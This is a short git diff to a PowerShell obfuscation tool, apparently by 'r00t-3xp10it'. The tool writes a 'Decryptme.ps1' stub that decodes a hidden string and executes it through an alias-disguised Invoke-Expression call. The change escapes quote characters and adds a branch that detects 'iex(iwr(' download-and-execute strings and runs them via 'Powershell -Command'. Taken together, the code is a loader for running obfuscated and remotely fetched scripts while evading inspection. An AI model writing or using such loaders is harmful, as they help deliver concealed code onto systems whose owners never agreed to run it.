@@ -211,6 +211,9 @@ Process{
         If($Action -ieq "decryptme")
         {
         
+        #EScaping special chars in obfucated string
+        $ResultText = $ResultText -replace '"','`"'
+
 $PS1DecriptRot = @("<#
 .SYNOPSIS
    Author: r00t-3xp10it
@@ -263,14 +266,17 @@ Process{
         } 
     
        Try{#EXECUTE
-          echo `"`$ResultText`"|&(DIR Alias:/I*X)
-       }catch{Write-Host `"x Error: execution failed ..`" -ForeGroundColor red}
+          If(`$ResultText -iMatch '^(iex\(iwr\()'){Powershell -Command `"`$ResultText`"}Else{echo `"`$ResultText`"|&(DIR Alias:/I*X)}
+       }Catch{Write-Host `"x Error: execution failed ..`" -ForeGroundColor red}
     }
 }")
 
+
+
+
            #Write Ps1 script to the sellected directory!
            echo "$PS1DecriptRot"|Out-File "$pwd\Decryptme.ps1" -encoding ascii -force
-           Write-Host "*" -ForegroundColor Green -NoNewline;
+           Write-Host "`n*" -ForegroundColor Green -NoNewline;
            Write-Host " written to: '" -ForegroundColor DarkGray -NoNewline;
            Write-Host "$pwd\Decryptme.ps1" -ForegroundColor Green -NoNewline;
            Write-Host "'`n" -ForegroundColor DarkGray;
